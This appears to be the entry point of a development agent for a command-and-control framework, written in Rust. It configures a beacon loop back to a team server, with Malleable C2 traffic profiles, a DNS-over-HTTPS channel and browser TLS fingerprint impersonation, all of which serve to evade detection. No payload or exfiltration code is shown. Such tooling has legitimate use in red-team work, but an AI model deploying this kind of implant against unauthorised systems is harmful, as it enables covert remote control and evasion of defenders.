use nyx_agent_dev::Config;

fn main() -> anyhow::Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env().unwrap_or_else(|_| "warn".into()),
        )
        .init();

    let server_url =
        std::env::var("NYX_SERVER").unwrap_or_else(|_| "http://127.0.0.1:8443".to_string());
    let server_pub_hex = std::env::var("NYX_SERVER_PUB").expect("NYX_SERVER_PUB required (hex)");
    let server_pub = hex::decode(&server_pub_hex)
        .expect("NYX_SERVER_PUB must be hex")
        .try_into()
        .expect("NYX_SERVER_PUB must be 32 bytes");
    let sleep_seconds: u32 = std::env::var("NYX_SLEEP")
        .ok()
        .and_then(|s| s.parse().ok())
        .unwrap_or(5);

    tracing::info!(%server_url, "nyx dev agent starting");
    let work_dir =
        std::path::PathBuf::from(std::env::var("NYX_WORKDIR").unwrap_or_else(|_| ".".to_string()));
    // Ensure the work directory exists before entering the beacon loop. File
    // ops (mkdir/cp/mv/...) resolve paths against `work_dir` via
    // `canonicalize`, which fails outright if the directory is absent — so a
    // freshly-configured NYX_WORKDIR (e.g. /tmp/nyx-agent-workdir) would make
    // every relative FileOp return an error on the first beacon. "." (the
    // default) always exists, so this is effectively a no-op unless the
    // operator pointed NYX_WORKDIR somewhere new.
    std::fs::create_dir_all(&work_dir).map_err(|e| {
        anyhow::anyhow!(
            "NYX_WORKDIR `{}` cannot be created: {e}",
            work_dir.display()
        )
    })?;
    // Optional Malleable C2 profile: when set, the agent applies the profile's
    // http-post client envelope on each send (steps + headers + UA + URI) and
    // inverts the server.output envelope on responses — the same two-sided
    // shaping the PIC implant applies. The beacon URI defaults to the
    // profile's http-post uri when the profile declares one.
    let profile = match std::env::var("NYX_PROFILE") {
        Ok(p) => {
            let src = std::fs::read_to_string(&p)?;
            Some(nyx_profile::parse(&src)?)
        }
        Err(_) => None,
    };
    let beacon_uri = match std::env::var("NYX_BEACON_URI") {
        Ok(u) if !u.is_empty() => u,
        _ => profile
            .as_ref()
            .and_then(|p| p.http_post())
            .and_then(|b| b.get("uri"))
            .map(|u| u.as_str().into_owned())
            .unwrap_or_else(|| "/beacon".to_string()),
    };
    // Beacon channel: https (default) or doh (spec-2, against the team
    // server's /dns-query responder).
    let channel = match std::env::var("NYX_CHANNEL").as_deref() {
        Ok("doh") => nyx_agent_dev::BeaconChannelKind::Doh,
        _ => nyx_agent_dev::BeaconChannelKind::Https,
    };
    let doh_server =
        std::env::var("NYX_DOH_SERVER").unwrap_or_else(|_| format!("{server_url}/dns-query"));
    let doh_domain = std::env::var("NYX_DOH_DOMAIN").unwrap_or_default();
    // Browser TLS impersonation (requires the `impersonation` feature):
    // chrome | firefox | safari | edge.
    let impersonate = match std::env::var("NYX_IMERSONATE").as_deref() {
        Ok("chrome") => Some(nyx_transport::fingerprint::BrowserProfile::Chrome),
        Ok("firefox") => Some(nyx_transport::fingerprint::BrowserProfile::Firefox),
        Ok("safari") => Some(nyx_transport::fingerprint::BrowserProfile::Safari),
        Ok("edge") => Some(nyx_transport::fingerprint::BrowserProfile::Edge),
        _ => None,
    };
    #[cfg(not(feature = "impersonation"))]
    if impersonate.is_some() {
        tracing::warn!(
            "NYX_IMERSONATE is set but this build lacks the `impersonation` feature; \
             using the plain ureq client (rebuild with --features impersonation)"
        );
    }
    nyx_agent_dev::run(Config {
        server_url,
        server_pub,
        sleep_seconds,
        jitter_pct: 20,
        work_dir,
        beacon_uri,
        profile,
        channel,
        doh_server,
        doh_domain,
        impersonate,
    })
}
